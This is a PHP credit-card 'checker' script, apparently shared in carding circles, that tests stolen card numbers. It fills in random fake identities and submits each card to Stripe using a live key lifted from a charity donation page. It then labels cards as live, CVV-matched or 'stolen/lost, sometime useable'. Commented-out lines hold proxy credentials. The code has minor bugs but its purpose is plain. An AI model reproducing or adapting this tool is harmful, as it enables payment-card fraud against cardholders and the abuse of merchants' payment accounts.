<?php


///////////////////////////////////Made by Checker By 🆃🅷🅴🅹🆇🆂/////


error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
/*
function 🆃🅷🅴🅹🆇🆂proxys();
{ 
  $Checker By 🆃🅷🅴🅹🆇🆂 = file("proxy.txt");
  $myproxy = rand(0, sizeof(Checker By 🆃🅷🅴🅹🆇🆂) - 1);
  $Checker By 🆃🅷🅴🅹🆇🆂 = $Checker By 🆃🅷🅴🅹🆇🆂[$Checker By 🆃🅷🅴🅹🆇🆂];
  return Checker By 🆃🅷🅴🅹🆇🆂;
}
$Checker By 🆃🅷🅴🅹🆇🆂proxies = 🆃🅷🅴🅹🆇🆂proxys();
*/

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];


////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
/////////========Luminati
//curl_setopt($curl, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
//curl_setopt($curl, CURLOPT_PROXYUSERPWD, 'spf8cab748:@mitPogi123');
////////=========Socks Proxy
//curl_setopt($ch, CURLOPT_PROXY, $Checker By 🆃🅷🅴🅹🆇🆂proxies);
curl_setopt($ch, CURLOPT_URL, 'https://donate/');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'accept: application/json',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US',
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/m/v3/index-933c5ec6e698f8e8c478639778699b64.html?distinct_id=b024204a-cbf9-ca4e-56ba-d8ff3b0608c1',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36'
 ));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fanida.org%2Fpages%2Fdonateguestpage%2F1&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]=markojohs%40gmail.com&time_on_page=24997&guid=57e715ea-2245-41ce-a7e6-1c11b7b576f1&muid=6ba0e6ff-83a6-43ab-b4fc-e80fe5f2c70e&sid=c46901ae-6c62-4856-8371-94cc900bd272&key=pk_live_e0UTN6yOJG9h2DnVQetz1MDi');

$result = curl_exec($ch);
$message = trim(strip_tags(getStr($result,'"message":"','"'))); 
////////////////////////////===[Card Response]

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ⚡ CVV MATCHED ⚡ 🆃🅷🅴🅹🆇🆂</span></br>';
}
elseif(strpos($result, "An Internal Error Has Occurred" )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ⚡ CVC MATCHED ⚡ 🆃🅷🅴🅹🆇🆂</span></br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ⚡ CVC MATCHED ⚡ 🆃🅷🅴🅹🆇🆂</span></br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> 🔥 CCN LIVE Checker 🔥 By 🆃🅷🅴🅹🆇🆂 👽</span></br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> 🔥 CCN LIVE 🔥 Checker By 🆃🅷🅴🅹🆇🆂 👽</span></br>';
}
elseif(strpos($result, 'Your card&#039;s security code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> 🔥 CCN LIVE 🔥 Checker By 🆃🅷🅴🅹🆇🆂 👽</span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> 🔥 CCN LIVE 🔥 Checker By 🆃🅷🅴🅹🆇🆂 👽</span></br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ⚡ CVC MATCHED ⚡ - Incorrect Zip 🆃🅷🅴🅹🆇🆂</span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ⚓ Stolen_Card ⚓ - Sometime Useable Checker By 🆃🅷🅴🅹🆇🆂 🤖</span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ⚓ Lost_Card ⚓ - Sometime Useable Checker By 🆃🅷🅴🅹🆇🆂 🤖</span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ⚓ Insufficient Funds ⚓ Checker By 🆃🅷🅴🅹🆇🆂 👾</span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🏴‍☠️ Card Expired 🏴‍☠️ Checker By 🆃🅷🅴🅹🆇🆂 👺</span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ⚓ Pickup Card_Card ⚓ - Sometime Useable Checker By 🆃🅷🅴🅹🆇🆂 🤖</span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🔆 Incorrect Card Number 🔆 🆃🅷🅴🅹🆇🆂</span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🔆 Incorrect Card Number 🔆 🆃🅷🅴🅹🆇🆂</span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🔱 Card Declined 🔱 🆃🅷🅴🅹🆇🆂</span> </br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🔱 Declined : Generic_Decline 🔱 🆃🅷🅴🅹🆇🆂</span> </br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🔱 Declined : Do_Not_Honor 🔱 🆃🅷🅴🅹🆇🆂</span> </br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🏴‍☠️ Security Code Check : Unchecked [Proxy Dead] 🏴‍☠️ 🆃🅷🅴🅹🆇🆂</span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🏴‍☠️ Security Code Check : Fail 🏴‍☠️ 🆃🅷🅴🅹🆇🆂</span> </br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🏴‍☠️ Expired Card 🏴‍☠️ 🆃🅷🅴🅹🆇🆂</span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🏴‍☠️ Card Doesnt Support This Purchase 🏴‍☠️ 🆃🅷🅴🅹🆇🆂</span> </br>';
}
 else {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🏴‍☠️ Proxy Dead / Error Not Listed 🏴‍☠️ 🆃🅷🅴🅹🆇🆂</span> </br>';
}

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response
//echo $result 

////////////////////// 1req Checker Made By Checker By 🆃🅷🅴🅹🆇🆂
////////////////////// Join @ghett000 for more
?>
